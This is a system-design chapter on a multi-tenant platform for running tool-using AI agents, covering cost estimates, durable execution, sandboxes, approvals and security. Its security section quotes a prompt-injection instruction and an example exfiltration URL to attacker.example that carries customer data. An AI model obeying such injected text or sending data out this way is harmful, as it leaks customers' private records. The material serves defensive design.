# Design a platform for running AI agents (long-running, tool-using tasks for many customers)

A support-software company wants every new ticket labelled and answered in draft before a person opens it. A research firm wants a report on twenty competitors every Monday. A data team wants an agent that writes and runs SQL in a sandbox until a query is right. Each could wrap a model API in its own loop and rebuild crash recovery, sandboxes, approvals, budgets and logs. This chapter designs a hosted service that provides them to thousands of customers.

A customer defines an **agent**: instructions, tools and a model. Each start, by API call, schedule or webhook, creates a **run**, which loops model call, tool calls, model call until the model answers or a limit stops it. [Agents and tool use](/learn/ai-agents) explains the loop and [security for AI systems](/learn/ai-security) the attacks it invites. Model calls go through an [LLM gateway](/learn/design-llm-gateway), which handles provider routing, retries and team budgets, so this chapter covers what sits above it.

## Requirements and estimates

Functional requirements:

- **Versioned agents.** Each change creates an immutable version, and a run keeps the version it started with.
- **Runs start** from an API call, a cron schedule or a webhook, and **stream progress events**: steps, tool calls, approval requests and the result.
- **Human approval** for risky tool calls, with the run paused until a person decides.
- **Built-in tools** (web fetch, code sandbox, browser) and **customer tools**: HTTP endpoints and Model Context Protocol (MCP) servers, which expose tools over JSON-RPC ([connecting tools with MCP](/learn/ai-agents#connecting-tools-with-mcp)).
- **Per-run limits** on steps, tokens, wall-clock time and dollars.

Non-functional requirements: a run resumes after any crash without repeating a side effect. One tenant cannot see another's data, slow its runs or spend its money. An acknowledged run is never lost.

**Workload.** Assume 4,000 tenants start **2 million runs a day** in three shapes (invented numbers). A **step** is one model call plus the tool calls it requests. A run starts with a fixed prefix (system prompt and tool definitions), and each step appends the model's output and tool results.

| Run kind | Runs a day | Steps | Prefix | Added per step | Output per step | Duration |
|---|---|---|---|---|---|---|
| Ticket triage | 1,500,000 | 8 | 6,000 | 1,000 | 250 | 1.5 min |
| Web research | 400,000 | 30 | 8,000 | 2,500 | 400 | 8 min |
| Sandbox (code or browser) | 100,000 | 60 | 10,000 | 2,000 | 500 | 30 min |

That is 2,000,000 ÷ 86,400 ≈ 23 runs a second. Schedules bunch at the start of working hours, so assume a peak of three times that, about **69 a second**. The runs make 1.5M × 8 + 400k × 30 + 100k × 60 = **30 million steps a day**.

**Tokens grow quadratically.** Step k reads the prefix P plus k − 1 additions of d tokens, P + (k − 1) × d. Over n steps a run reads n × P + d × n(n − 1) ÷ 2 input tokens, and the second term grows with the square of n.

- Triage: 8 × 6,000 + 1,000 × 28 = **76,000** input tokens. The last step reads 13,000.
- Research: 30 × 8,000 + 2,500 × 435 = **1,327,500**. The last step reads 80,500.
- Sandbox: 60 × 10,000 + 2,000 × 1,770 = **4,140,000**. The last step reads 128,000.

A sandbox run has 7.5 times the steps of a triage run and reads 54 times the tokens. The platform sends about **1.06 trillion input tokens a day**.

**Model spend.** Assume $3 per million input and $15 per million output tokens. Uncached, a research run costs 1,327,500 × $3 ÷ 10⁶ + 12,000 × $15 ÷ 10⁶ = $3.98 + $0.18 = **$4.16**. With [prompt caching](/learn/ai-agents#caching-the-stable-prefix), step k reads step k − 1's whole prompt from cache and writes only the new d tokens. Assume reads cost 0.1 times the input price ($0.30 per million), writes 1.25 times ($3.75), and the agent's prefix is already cached by earlier runs. A research run then reads 1,255,000 tokens and writes 72,500: 1,255,000 × $0.30 ÷ 10⁶ + 72,500 × $3.75 ÷ 10⁶ + $0.18 = $0.377 + $0.272 + $0.18 = **$0.83**.

| Run kind | Uncached | Cached | Ratio | Per month, cached |
|---|---|---|---|---|
| Ticket triage | $0.258 | $0.077 | 3.4× | $3.46 million |
| Web research | $4.16 | $0.83 | 5.0× | $9.94 million |
| Sandbox | $12.87 | $2.10 | 6.1× | $6.30 million |

Over 30 days that is about **$19.7 million a month** with caching and **$100 million** without, $0.33 per run on average. Longer runs gain more, because more of each prompt is history already sent. It needs a byte-stable prefix and steps within the cache's time to live (TTL).

**Concurrent runs.** By [Little's law](/learn/performance-and-latency#littles-law), runs in flight equal arrival rate times duration. At peak, triage arrives at 3 × 1,500,000 ÷ 86,400 ≈ 52.1 a second for 90 seconds, so about 4,690 are active. Research gives 13.9 × 480 ≈ 6,670 and sandbox 3.47 × 1,800 ≈ 6,250, about **17,600 active runs** and 1,040 steps a second. The gateway carries about 1.78 million uncached input tokens a second (107 million a minute) and 22.5 million output tokens a minute, which needs quotas across several provider accounts.

**Sandboxes.** Only sandbox runs hold a virtual machine for their whole life, 6,250 at peak. Assume half run code in 1 GiB and half a browser in 2 GiB, 9,400 GiB in all. A host with 128 vCPUs and 512 GiB, keeping 64 GiB for itself, fits 448 ÷ 1.5 ≈ 298 by memory. Sandboxes mostly wait for the model, so assume 2 vCPUs each overcommitted 4 to 1: 128 × 4 ÷ 2 = 256. CPU binds, so 6,250 plus a warm pool of 100 needs 25 hosts. With two of three zones carrying the peak, that is 13 per zone, **39 hosts**: at an assumed $5 an hour, $142,350 a month, or $0.047 per sandbox run against $2.10 of model spend.

**Run log.** Each step stores what it added. A research run adds 72,500 + 12,000 = 84,500 tokens, about 338 KB at 4 bytes a token. Triage adds 36 KB and sandbox 592 KB, so the log grows 54 + 135 + 59 ≈ **248 GB a day**, 7.5 TB over 30 days before replication. At about three events per step, that is **3,100 appends a second** at peak.

## API design

| Call | Purpose |
|---|---|
| `POST /v1/agents`, `POST /v1/agents/{id}/versions` | Create an agent and publish immutable versions. |
| `POST /v1/runs` | Start a run with an input and limits. Returns `202` and a run ID. |
| `GET /v1/runs/{id}/events` | Stream events over [server-sent events](/learn/realtime#server-sent-events-sse), resuming from `Last-Event-ID`. |
| `POST /v1/runs/{id}/approvals/{aid}` | Approve or reject a paused tool call. |
| `POST /v1/runs/{id}/cancel` | Stop a run at the next safe point. |
| `POST /v1/schedules`, `POST /v1/triggers` | Start runs from a cron expression or a webhook. |

`POST /v1/runs` takes an `Idempotency-Key` header, so a retried start returns the same run ([idempotency keys](/learn/reliability-patterns#idempotency-keys)). Webhooks use the sender's delivery ID as the key. Each streamed event's `id` is its sequence number in the run log, so a client reconnecting with `Last-Event-ID: 57` gets event 58 onwards.

## High-level design

```diagram
title: A run's path. Workers are stateless, and the run store holds every run.
[cl:client] Customer API,\nschedules,\nwebhooks @ 0,1
[api] Run API\nauth, quotas @ 1,1
[reg:store] Agent registry\nversions @ 1,0
[rs:store] Run store\nevent log @ 3,2.2
[sch:queue] Scheduler\nfair step queues @ 2,1
[wk] Run workers\nstep loop @ 3,1
[gw] LLM gateway\nto providers @ 4,0
[tr] Tool runtime\nsandboxes, fetch,\nMCP, HTTP @ 4,2
[es] Event stream\nSSE readers @ 1,2.2
cl <-> api : start, approve
api --> reg : resolve version
api -> sch : enqueue run
sch -> wk : step task
wk <-> rs : append
wk -> gw : model call
wk -> tr : tool call
rs --> es : tail log
es --> cl : progress
```

The run API resolves the agent version, writes `run_created` and enqueues the run. The scheduler hands out one step at a time, fairly across tenants. A worker takes a **lease** on the run (a lock that expires unless renewed), rebuilds state from the log, calls the model through the gateway, runs the requested tools, appends each result and returns the run. Event-stream servers tail the log and push new events to clients.

Workers mostly wait on the network. If one asynchronous process drives 500 runs (an assumption to load-test), 17,600 runs need 36 processes. Any two of three zones must hold 36, so each zone runs 18, **54** in all.

## The run loop as a durable workflow

A 30-minute sandbox run will meet deploys, host failures and hung calls. The goal is **durable execution**: the run continues on any worker from where it stopped, and each side effect takes effect once.

```diagram
title: Run states. Waiting states hold no worker.
[q] Queued @ 0,1
[r] Running\none step at\na time @ 1.5,1
[ap] Paused for\napproval @ 1.5,0
[bo] Backing off\nprovider 429 @ 1.5,2
[ok:note] Succeeded @ 3.5,0
[fl:note] Failed, limit\nor loop stop @ 3.5,1
[cx:note] Cancelled or\nexpired @ 3.5,2
q -> r : lease taken
r <-> ap
r <-> bo
r -> ok : final answer
r -> fl
r -> cx
```

The run store keeps an **event-sourced log** per run: an ordered list of events (`run_created`, `model_reply`, `tool_started`, `tool_result`, `approval_requested`, `approval_decided`, `compacted`, `run_finished`) from which the state is rebuilt by replaying them. The **checkpoint** after each step is the append itself. The model's reply is written before any tool it requested runs, so a crash never forces a second model call, whose answer could differ.

Each append names the sequence number it expects, and the store rejects it if the log has moved on. That works as a **fencing token** ([leases and fencing tokens](/learn/consensus#leases-and-fencing-tokens)), so a stalled worker that lost its lease cannot overwrite its successor. Workers renew a 30-second lease every 10 seconds, a **heartbeat**, and after three misses the run moves, as with a [visibility timeout](/learn/queues-and-async#acknowledgements-and-visibility-timeouts). Every call has a [deadline](/learn/reliability-patterns#timeouts-and-deadlines), from 30 seconds for an HTTP tool to 20 minutes for a test suite, and long tool calls send their own heartbeats.

### Tool calls and idempotency

Repeating a model call is safe, though it costs money. A tool call can create a ticket or send an email. The danger is a worker that dies after the tool acted and before the result was appended: the log shows `tool_started` and nothing after it.

Delivery is **at least once**, so a tool may receive a call twice. Each call carries an idempotency key built from IDs already in the log, `run_id:tool_use_id`, so every attempt sends the same key ([duplicates are normal](/learn/queues-and-async#duplicates-are-normal-so-make-workers-idempotent)). Built-in tools honour it, and customer HTTP tools receive it as an `Idempotency-Key` header and declare whether they honour it. MCP's tool call has no standard idempotency field, so MCP tools count as not retry-safe unless the customer says otherwise. After a crash, a retry-safe call is resent with the same key. Any other call gets an "outcome unknown" error result, so the model can check, say by searching for the ticket, before acting again.

```python
LOG, TICKETS = [], {}   # run log; customer tickets by idempotency key

def append(seq, event):
    if seq != len(LOG):                 # a stale worker cannot write
        raise RuntimeError(f"conflict: log at {len(LOG)}, writer expected {seq}")
    LOG.append(event)

def create_ticket(title, key):          # a repeated key returns the first result
    return TICKETS.setdefault(key, f"T-{len(TICKETS) + 1}")

TOOLS = {"create_ticket": {"fn": create_ticket, "idempotent": True}}

def run_tool(run_id, call, crash=False):
    seen = {(e["type"], e.get("call_id")) for e in LOG}
    if ("tool_result", call["id"]) in seen:
        return                          # already recorded: nothing to do
    tool = TOOLS[call["name"]]
    if ("tool_started", call["id"]) in seen and not tool["idempotent"]:
        append(len(LOG), {"type": "tool_result", "call_id": call["id"],
                          "is_error": True, "content": "outcome unknown"})
        return
    if ("tool_started", call["id"]) not in seen:
        append(len(LOG), {"type": "tool_started", "call_id": call["id"]})
    result = tool["fn"](**call["input"], key=f"{run_id}:{call['id']}")
    if crash:
        raise SystemExit("worker died before recording the result")
    append(len(LOG), {"type": "tool_result", "call_id": call["id"], "content": result})

call = {"id": "toolu_7", "name": "create_ticket", "input": {"title": "Refund A-1042"}}
append(0, {"type": "model_reply", "tool_calls": [call]})
try:
    run_tool("run_42", call, crash=True)
except SystemExit as e:
    print(e)                            # worker died before recording the result
run_tool("run_42", call)                # the next worker
print(len(LOG), TICKETS)                # 3 {'run_42:toolu_7': 'T-1'}
try:
    append(2, {"type": "tool_result"})  # the first worker wakes up late
except RuntimeError as e:
    print(e)                            # conflict: log at 3, writer expected 2
```

The next worker resends with the same key and gets T-1 back, so one ticket exists, and the late write is refused. A run that did part of a multi-step change needs compensating steps, as in [sagas](/learn/distributed-transactions#sagas), which the platform can offer as undo tools.

**Build or use an engine.** Durable-execution engines provide this log, leases, timers and replay. In Temporal, a run would be a workflow, each model and tool call an **activity** (a unit of work whose result the engine records), and an approval a signal. Temporal replays workflow code against recorded history, reusing activity results, so that code must be deterministic ([checkpoints and durable execution](/learn/ai-agents#checkpoints-and-durable-execution)). Temporal limits history size, so large outputs go to object storage by reference, and it cannot see inside an activity, so the keys are still needed.

## Scheduling and fairness

One tenant schedules 50,000 triage runs for 09:00. In arrival order, every other tenant would wait behind them.

**Admission.** Each tenant has a cap on active runs, say 500 on the standard plan, and runs above it wait in the tenant's own queue. The batch takes 50,000 × 90 ÷ 500 = 9,000 seconds, **2.5 hours**. Schedules accept a start window, such as "within 15 minutes of 09:00", which the scheduler spreads starts across.

**Step dispatch.** Admitted runs compete for workers and provider quota one step at a time, through a weighted fair queue across tenants like the inference platform's [fair queuing](/learn/design-inference-platform#priority-and-fairness). Steps of runs in progress go first, since finishing frees sandboxes and uses warm caches, then new interactive runs, then scheduled ones.

**Provider backpressure.** When the gateway reports 429 rate-limit errors for a model, the scheduler halves that model's dispatch rate, then raises it by a fixed amount each second while calls succeed (additive increase, multiplicative decrease, or AIMD). That wait does not count against the run's wall-clock limit. If queues keep growing, new scheduled runs are refused first ([back pressure](/learn/queues-and-async#back-pressure-when-the-queue-keeps-growing)).

## Context management

The cost table assumed short tool results and a cached prefix. Both take design work.

**Truncate tool results.** A fetched page is often 12,000 tokens. If research steps added 12,500 tokens, the context would reach 8,000 + 16 × 12,500 = 208,000 at step 17, past a 200,000-token window. So fetch returns at most 2,000 tokens (the title, the best-matching passage and a handle), stores the page, and a `read_more(handle, offset)` tool pages through it. The sandbox returns the last 100 lines of output and a file path.

**Keep the prefix stable.** A cache hit needs the earlier prompt byte for byte, so each prompt is built in a fixed order:

1. A per-tenant line, so no prefix matches across tenants and nobody can detect another tenant's prompts by hit timing ([affinity and isolation](/learn/design-inference-platform#affinity-and-isolation)).
2. The version's system prompt and tool definitions, serialized identically every time, with nothing per-run such as the date.
3. The run's input, then the steps, only ever appended.

With the assumed provider an entry lives five minutes after last use, so a step after a 10-minute test run finds a cold cache. For such agents the platform buys a longer TTL, at a higher write price.

**Compact long runs.** **Compaction** replaces older steps with a summary the model writes. Past a threshold the platform keeps the prefix, a 4,000-token summary and the last two steps, and the full history stays in the log. Each compaction costs a call with 4,000 output tokens, and the next step misses the cache after the prefix.

| Run kind and policy | Largest context | Input tokens | Cached cost | Uncached cost |
|---|---|---|---|---|
| Research, no compaction | 80,500 | 1,327,500 | $0.83 | $4.16 |
| Research, compact at 60,000 | 58,000 | 996,500 | $0.82 | $3.23 |
| Sandbox, no compaction | 128,000 | 4,140,000 | $2.10 | $12.87 |
| Sandbox, compact at 60,000 | 60,000 | 2,240,000 | $1.70 | $7.29 |

With caching, compaction barely changes a research run's cost, because cached reads were already cheap, and sandbox runs save 19%, about $1.2 million a month. The stronger reasons are that answers degrade and latency grows with context ([managing context](/learn/ai-agents#managing-context)), and long runs stay inside the window.

## Tool execution and sandboxes

```diagram
title: Tool calls pass policy, then reach the world only through the proxy
[wk] Run worker @ 0,1
[pol] Tool router\npolicy, approval @ 1,1
[hu:client] Approver\n(a person) @ 1,0
[sb] MicroVM\ncode, browser @ 2,2
[px] Egress proxy\nallowlist @ 3,1
[vt:store] Secrets vault\nper tenant @ 3,0
[ext:client] Customer APIs,\nMCP servers, web @ 4,1
wk -> pol : call with key
pol <-> hu : risky calls
pol -> sb : run code
sb -> px : all traffic
pol -> px : HTTP, MCP
vt -> px : token per call
px -> ext
```

**Isolation.** Model-written code, possibly steered by an attacker, must not reach other tenants or the host. Each sandbox run gets its own **microVM**, a small virtual machine with its own kernel and a minimal device set. Firecracker, built by AWS for Lambda, is a common choice. Its site cites start times as low as 125 ms and under 5 MiB of overhead per microVM. **gVisor** is lighter: a kernel in user space that intercepts the sandbox's system calls, packing more densely with a weaker boundary than hardware virtualization. The platform uses microVMs for any customer or model code, one per run, destroyed afterwards.

**Warm pools.** A browser image also has to boot its guest and start the browser, assumed 2 to 3 seconds. The platform keeps booted, unassigned sandboxes ready. The pool covers arrivals during a refill: 3.47 starts a second times an assumed 10-second refill is about 35, and doubling for bursts gives 70 to 100. It scales with the start rate, while the 6,250 in use scale with run length.

**Egress.** A sandbox has no network by default. When a version allows it, traffic goes through an egress proxy that enforces the version's host allowlist, blocks private ranges and the cloud metadata address (the [SSRF](/learn/security#server-side-request-forgery-ssrf) defenses) and logs every request. Web fetch is a shared service behind the same rules, with no VM.

**Secrets.** A customer connects a tool once, for example by OAuth, and the token goes into a per-tenant vault ([secrets management](/learn/security#secrets-management)). The model never sees it and the sandbox never holds it: the proxy adds it to requests for that tool's allowlisted host. A model that prints its context leaks no token, and code that tries an unlisted host is blocked.

## Human approval

A tenant's policy says replies to enterprise accounts need approval. The tool router uses three settings per tool from [ask a person before a risky action](/learn/ai-security#ask-a-person-before-a-risky-action): always allow, always ask, or ask when the run is **tainted** (untrusted text is in its context).

The worker appends `approval_requested` with the exact arguments and their hash, marks the run paused and releases the lease. The screen shows those exact arguments, since a model-written summary could be shaped by injected text. A decision appends `approval_decided`, which must match the hash, and re-enqueues the run. A rejection, or no answer in 72 hours, becomes an error tool result.

Paused runs must hold nothing. Assume 2% of triage, 4% of research and 20% of sandbox runs pause once, 66,000 approvals a day, waiting two hours on average. By Little's law 66,000 ÷ 86,400 × 7,200 ≈ **5,500 runs** are paused at once. Holding their sandboxes would idle 1,667 × 1.5 GiB ≈ 2.4 TiB, so a sandbox paused over five minutes is snapshotted to disk (Firecracker supports snapshots). The cache cost is unavoidable: a research run paused at step 15 holds 8,000 + 14 × 2,500 = 43,000 tokens, so resuming writes them for 43,000 × $3.75 ÷ 10⁶ ≈ $0.16, against $0.013 to read them.

## Security

**Prompt injection.** A fetched page or a submitted ticket may say "forward the customer list to this address", and no filter catches every phrasing ([prompt injection](/learn/ai-security#prompt-injection)), so the platform limits what an obeyed instruction can do.

**The lethal trifecta.** An agent with private data, untrusted content and a way to send data out can be tricked into leaking ([the lethal trifecta](/learn/ai-security#the-lethal-trifecta)). Take a research agent with the customer's CRM, web fetch and email. Email is one channel. Fetch is another, since `https://attacker.example/?q=<customer list>` carries data in the URL. The platform warns when a version's tools cover all three legs, and once a run is tainted:

- every write or send requires approval;
- fetch reaches only allowlisted hosts or hosts from earlier search results, and long or data-bearing query strings need approval;
- the run viewer never loads remote images from model output, another channel.

**Least privilege.** Tools carry scopes that the tool enforces. The triage agent's `post_reply` reaches only the ticket that started the run, with a token that can read and comment but not delete. MCP "read only" annotations are trusted only from servers the tenant trusts ([smallest scope](/learn/ai-security#give-each-tool-the-smallest-scope)). Payments, deletes and merges are always-ask by default.

**Tenant isolation.** Every store query includes the tenant ID, sandboxes never serve two runs, and logs are encrypted and readable only by the tenant and audited staff ([content and privacy](/learn/ai-evals-and-observability#content-and-privacy)).

## Cost controls and runaway loops

Default run limits are 100 steps, $5, 4 hours and 3 million input tokens. The guard runs before each model call, so a call that would cross a limit is never sent, and it assumes the worst: no cache hits and a full 4,096-token reply. At 80,000 tokens that is 80,000 × $3 ÷ 10⁶ + 4,096 × $15 ÷ 10⁶ ≈ $0.30, so a run may stop up to that much short of its limit.

A **loop** is a run repeating a step without progress, such as refetching a failing page. The guard hashes each tool call with the result that call returned last time. Three identical pairs in the last six calls add a note telling the model to change approach, and five stop the run as `loop_detected`. The result is in the hash because polling a build repeats a call until its result changes.

```python
import hashlib, json

class RunGuard:
    def __init__(self, max_steps=100, max_usd=5.00, max_out=4096):
        self.max_steps, self.max_usd, self.max_out = max_steps, max_usd, max_out
        self.steps, self.spent, self.recent = 0, 0.0, []

    def before_model_call(self, context_tokens):
        worst = (context_tokens * 3.00 + self.max_out * 15.00) / 1e6   # no cache hits
        if self.steps >= self.max_steps or self.spent + worst > self.max_usd:
            return f"stop: next call could cost ${worst:.3f}"
        self.steps += 1
        return "ok"

    def before_tool_call(self, name, args, last_result):
        sig = hashlib.sha256(json.dumps([name, args, last_result]).encode()).hexdigest()
        self.recent = (self.recent + [sig])[-6:]
        n = self.recent.count(sig)
        return "stop: loop" if n >= 5 else "warn: try another approach" if n >= 3 else "ok"

g = RunGuard(max_usd=1.00)
g.spent = 0.70
print(g.before_model_call(80_000))     # stop: next call could cost $0.301
print([g.before_tool_call("fetch", {"url": "/p2"}, "HTTP 503") for _ in range(5)])
# ['ok', 'ok', 'warn: try another approach', 'warn: try another approach', 'stop: loop']
```

Above the run, tenants get monthly budgets with alerts at 50%, 80% and 100%, enforced in the gateway ([put limits at several levels](/learn/ai-security#put-limits-at-several-levels)).

## Observability, replay and evals

Each run is a trace with a span per model and tool call, with the [GenAI attributes](/learn/ai-evals-and-observability#the-genai-attributes). Dashboards show steps and cost per run at the median and 95th percentile, tool error rates, approval waits and how often each limit stops runs.

The log makes two tools cheap. **Replay** rebuilds a run from recorded replies and results, with no new calls, showing what the model saw at each step. **Fork** starts a new run from step k with a changed prompt or model, testing a fix against the exact failure.

Versions are evaluated on **trajectories**, the full sequence of steps: final-state checks in code (does the ticket have exactly one label?), step and cost limits, and repeated trials, since a version that succeeds 90% of the time passes five trials in a row only 0.9⁵ ≈ 59% of the time ([measuring agents](/learn/ai-agents#measuring-agents)). A model judge grades sampled runs for policy breaks ([running evals before release](/learn/ai-evals-and-observability#running-evals-before-release)).

## Multi-region and data residency

Each tenant has a home region holding its agents, logs, sandboxes and vault, and its model calls use endpoints there, so EU data stays in the EU. The run store replicates asynchronously to a standby region in the same jurisdiction. If a region fails, its runs resume there only for tenants that allow it, with in-flight tool calls on the "outcome unknown" path.

## Trade-offs to discuss

- **Durable engine or custom loop.** Temporal brings tested replay, timers and signals. A custom log is easier to stream and fork, and its correctness is the team's problem.
- **Compaction threshold.** Early compaction keeps steps fast and focused and loses detail a later step may need.
- **MicroVMs or gVisor.** A hardware boundary for model-written code costs memory and start time. gVisor packs more sandboxes per host behind a thinner boundary.
- **Approval friction.** Asking before every write teaches people to click yes. Taint-based approval asks less often and depends on tracking taint correctly.
- **Fairness or throughput.** Tenant caps protect everyone else and make a 50,000-run batch take 2.5 hours.

## Check yourself

<details>
<summary>At peak, research runs start at 13.9 a second and last 8 minutes, and triage runs start at 52.1 a second and last 90 seconds. Which has more runs in flight?</summary>

Research: 13.9 × 480 ≈ 6,670, against 52.1 × 90 ≈ 4,690 for triage. Research arrives about a quarter as often, and each run lasts 5.3 times as long.

</details>

<details>
<summary>A worker sends `create_invoice` to a customer's MCP server and dies before appending the result. What does the next worker do? What changes if the tool is an HTTP endpoint that honours `Idempotency-Key`?</summary>

MCP has no standard idempotency field, so the worker records an "outcome unknown" error result, and the model can look the invoice up before retrying. For the HTTP endpoint, the worker resends with the same `run_id:tool_use_id` key and gets the first invoice back.

</details>

<details>
<summary>Compacting sandbox runs at 60,000 tokens cuts cost from $12.87 to $7.29 uncached but only from $2.10 to $1.70 cached. Why the difference, and why compact anyway?</summary>

With caching the tokens it removes were cheap reads at $0.30 per million, and each compaction adds a summary call and a cache write. It is still worth it because quality and step latency degrade as context grows, and a 100-step run would otherwise pass a 200,000-token window (10,000 + 99 × 2,000 = 208,000).

</details>

<details>
<summary>Approvals average two hours. Why must a paused run not hold its worker and sandbox, and what does resuming cost?</summary>

About 5,500 runs are paused at once, and their 1,667 sandboxes would idle 2.4 TiB of memory, so the lease is released and the sandbox snapshotted. On resume the prompt cache has expired, so a research run with 43,000 tokens of context pays about $0.16 to rewrite it instead of $0.013 to read it.

</details>

<details>
<summary>A research agent can read the CRM and fetch any URL, and has no email tool. A teammate says it has no exfiltration channel. Is that right?</summary>

No. A fetch of `https://attacker.example/?q=` plus CRM data sends the data in the URL, so fetch is the third leg. Once the run is tainted, limit fetch to allowlisted hosts or hosts from earlier search results, and require approval for data-bearing query strings.

</details>

## Further reading

- [Building effective agents](https://www.anthropic.com/research/building-effective-agents) (Anthropic, December 19, 2024): workflows versus agents.
- [Effective context engineering](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents) and [Writing effective tools](https://www.anthropic.com/engineering/writing-tools-for-agents) (Anthropic, 2025): compaction and truncation.
- [ReAct](https://arxiv.org/abs/2210.03629) (Yao et al., 2022): the reason-and-act loop.
- [Model Context Protocol specification](https://modelcontextprotocol.io/specification/latest): tools and security principles.
- [Event History walkthrough with the Go SDK](https://docs.temporal.io/encyclopedia/event-history/event-history-go) (Temporal): replay from recorded events.
- [Firecracker](https://firecracker-microvm.github.io/) and its NSDI 2020 paper, [Lightweight Virtualization for Serverless Applications](https://www.usenix.org/conference/nsdi20/presentation/agache): microVM design and overheads.
- [gVisor documentation](https://gvisor.dev/docs/): a user-space kernel for sandboxing containers.
- [The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) (Simon Willison, June 2025)
- [OWASP Top 10 for LLM Applications, 2025](https://genai.owasp.org/llm-top-10/) and [LLM10: Unbounded Consumption](https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/): injection, agency, runaway spending.
- [Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching) and [Compaction](https://platform.claude.com/docs/en/build-with-claude/compaction) (Claude Platform docs).
